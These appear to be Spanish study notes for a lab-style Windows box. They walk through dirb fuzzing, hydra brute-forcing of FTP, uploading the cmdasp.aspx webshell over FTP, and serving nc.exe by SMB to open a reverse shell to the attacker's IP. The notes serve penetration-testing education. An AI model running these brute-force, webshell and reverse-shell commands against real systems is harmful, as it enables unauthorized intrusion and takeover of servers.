- Servidor Microsoft LLS -> Servidor que se utiliza en versiones antiguas de Windows Server (2000) para gestionar las licencias de productos de servidor de Microsoft que utilizaban modelos de licencia CAL.
- Webshell -> Permite interactuar con un servidor web de forma remota.


- Tenemos nuestra maquina victima windows, tiene el puerto 80 abierto, vamos a hacer fuzzing web con la herramienta ==dirb==
- dirb:
	- Escanea contenido web.
	- Web fuzzer que realiza ataques basados en diccionario contra servidores web.
```
dirb http://(IP_VICTIMA)
```
![[Pasted image 20250104191832.png]]
- Nos muestra directorios.
- vamos a ver el ==aspnet_client==
![[Pasted image 20250104191926.png]]
- No podemos ver nada.
- Tenemos el puerto 21 (ftp) abierto, vamos a hacer fuerza bruta utilizando 2 diccionarios, 1 para usuario y el otro para contraseña.
```
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-password-1000000.txt ftp://(IP_VICTIMA)
```
- También se puede ocupar el diccionario rockyou.txt en password.
![[Pasted image 20250104193123.png]]
- Encontramos el usuario y el password, ahora podemos entrar por el puerto ftp.
```
ftp (IP_VICTIMA)
```

- Ya estando dentro nos damo cuenta que tenemos un index.html
![[Pasted image 20250104194059.png]]
- A veces el contenido ftp esta vinculado con el puerto 80, es decir el ==index.html== va siendo la pagina apache del puerto 80, al igual que con ==welcome.png== y ==aspnet_client==.
- Entonces, podemos subir archivos y podríamos verlos en el navegador.
- Kali tiene por defecto una cmd maliciosa guardad en el sistema, para encontrarla ocupamos el siguiente comando:
```
find / -name cmdasp.aspx 2>/dev/null
```
![[Pasted image 20250104194605.png]]
- Este archivo lo vamos a mover a Desktop.
	- Para hacerlo usamos el siguiente comando
```
cp (RUTA_DEL_ARCHIVO) . 
```
![[Pasted image 20250104194751.png]]
- Para poder subir el archivo desde el protocolo ftp usamos el comando:
```
put (NOMBRE_ARCHIVO)
```
![[Pasted image 20250104194948.png]]
- Si lo ponemos en la URL nos saldra el archivo:
![[Pasted image 20250104195041.png]]
- Hacemos una web shell.
	- Lo vamos a hacer levantando un recurso compartido.
- Nos vamos a kali, buscamos nc.exe
```
find / -name nc.exe 2>/dev/null
```
![[Pasted image 20250104195337.png]]
- Copiamos el segundo y lo llevamos a Desktop
- Ahora vamos  a levantar un recurso compartido desde la maquina Kali.
- Vamos  a usar la herramienta impacket-smbserver.

==impacket-smbserver==
- Esta herramienta permite crear un servidor SMB temporalmente en una maquina, lo que permite compartir archivos y ejecutar comandos en el contexto del servidor.

```
impacket-smbserver (NOMBRE_RECURSO) $(pwd) -smb2support
```
![[Pasted image 20250104195927.png]]
- Ahora ponemos en escucha.
![[Pasted image 20250104200027.png]]
- Vamos al navegador al cmdasp.aspx donde podemos ejecutar comando y ponemos lo siguiente:
```
\\(IP_ATACANTE)\(NOMBRE_RECURSO)\(ARCHIVO_SUBIR) -e cmd.exe (IP_ATACANTE) (PUERTO)
```
-e --> Le decimos que queremos hacer una reverse shell, una cmd.exe a mi maquina atacante por el puerto especificado.
![[Pasted image 20250104200734.png]]
- Ya estamos dentro.